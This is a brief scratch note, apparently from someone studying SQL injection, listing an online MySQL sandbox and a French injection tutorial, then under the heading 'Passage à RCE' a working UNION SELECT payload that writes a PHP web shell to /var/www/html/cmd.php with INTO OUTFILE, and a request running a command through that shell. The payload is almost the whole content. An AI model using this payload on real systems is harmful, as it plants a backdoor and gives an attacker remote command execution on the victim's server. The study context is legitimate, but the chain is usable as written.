
https://extendsclass.com/mysql-online.html

https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/

''Passage à RCE''

cod=1+union+select+1,2,3,4,5,6,'<?php_system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
/cmd.php?cmd=id
